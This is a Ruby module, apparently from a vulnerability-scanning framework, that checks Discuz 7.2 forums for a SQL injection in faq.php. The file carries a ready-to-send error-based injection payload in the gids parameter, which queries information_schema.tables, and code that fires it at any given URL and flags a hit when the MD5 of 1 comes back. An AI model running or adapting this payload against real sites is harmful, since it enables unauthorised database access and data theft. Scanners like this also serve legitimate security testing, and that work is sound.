# encoding: utf-8

require 'net/http'
require 'uri'

class Exploit_3 < Playload::Issue

    def initialize
    	@name 			= "Discuz7.2 SQL"
        @type			= "discuz"
        @tags 			= "discuz"
        @description	= %q{Discuz7.2 faq.php Sql Exp: /bbs/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%281%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23}
        @references		= {'sebug' => 'http://sebug.net/vuldb/ssvid-87114'}
        @severity 		= :high
        @remedy_guidance = "SQL过滤"
        @is_found 		= false
        @is_error 		= false
    end

    def exp(url)
        begin
            uri = URI(url + '/bbs/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%281%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23')
            response = Net::HTTP.get_response(uri)
            if response.body.include?('c4ca4238a0b923820dcc509a6f75849b1') then
      	  		@is_found = true
            end 
        rescue
            puts "Send Exp Failed: #{$!}"
        end 
    end

end

Playload::Queue.add Exploit_3.new
